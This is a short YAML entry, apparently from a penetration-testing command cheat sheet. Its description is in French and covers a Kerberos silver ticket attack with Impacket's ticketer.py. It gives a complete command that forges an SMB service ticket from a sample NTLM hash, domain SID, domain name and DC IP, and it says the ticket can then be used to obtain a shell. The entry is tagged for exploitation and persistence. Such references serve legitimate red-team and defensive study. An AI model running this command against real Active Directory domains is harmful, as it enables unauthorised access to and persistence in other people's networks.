---
description: |
  Le logiciel ticketer.py d'Impacket peut effectuer des attaques par ticket d'argent, ce qui permet de créer un ticket TGS valide pour un service spécifique en utilisant le hachage NTLM d'un utilisateur valide. Il est alors possible d'accéder à ce service. La commande suivante crée un TGS pour le service SMB, qui peut ensuite être utilisé pour obtenir un shell.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Hash: b18b4b218eccad1c223306ea1916885f

  	Domain SID: S-1-5-21-1339291983-1349129144-367733775

  	SMB Service: cifs

command: |
  python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
items:
  - Username
  - Hash
services:
  - Kerberos
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
